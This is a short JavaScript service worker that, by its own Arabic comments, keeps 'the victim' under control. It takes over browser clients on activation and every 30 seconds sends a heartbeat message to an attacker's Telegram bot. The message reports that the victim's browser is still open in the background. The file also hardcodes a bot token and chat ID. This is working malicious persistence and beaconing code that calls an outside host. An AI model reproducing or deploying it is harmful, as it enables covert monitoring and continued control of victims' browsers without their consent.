const TOKEN = "8207943883:AAF_XJoeKlHEE2bB7Ro0PBVSvpihbuZ0fW0";
const CHAT_ID = "8350812242";

self.addEventListener('install', () => {
    self.skipWaiting();
});

self.addEventListener('activate', (event) => {
    event.waitUntil(clients.claim());
});

// إرسال إشارة كل 30 ثانية للبوت لضمان بقاء الضحية تحت السيطرة
setInterval(() => {
    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("📡 إشارة ثبات: الضحية لا يزال يفتح المتصفح في الخلفية.")}`);
}, 30000);
